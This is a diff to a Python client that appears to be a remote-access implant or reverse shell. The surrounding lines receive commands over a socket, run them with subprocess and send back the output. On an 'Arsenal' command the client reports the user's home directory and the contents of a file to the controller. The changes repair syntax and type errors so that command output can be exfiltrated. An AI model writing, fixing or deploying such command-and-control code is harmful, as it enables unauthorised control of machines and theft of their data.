@@ -18,7 +18,8 @@ def main():
             if 'cmd' in command:
                 del command[0]
                 print(command)
-                output = subprocess.run(command, stdout=subprocess.PIPE).stdout
+                output = subprocess.run(command, stdout=subprocess.PIPE)
+                output = output.stdout
             elif 'Arsenal' in command:
                 s.send(b'Client initial checkin\n')
                 s.send(bytes("Homedir: " + os.environ.get('HOME'), "utf-8"))
@@ -27,9 +28,9 @@ def main():
                     tmp = f.read()
                 s.sendall(bytes(tmp))
             elif 'sendbuf' in command:
-                s.send(bytes(str(len(output)), 'utf-8')
+                s.send(bytes(str(len(output)), 'utf-8'))
             elif 'ack' in command:
-                s.sendall(bytes(output, 'utf-8'))
+                s.sendall(bytes(str(output), 'utf-8'))
         except socket.error as err:
             print("{0}\n".format(err))
 
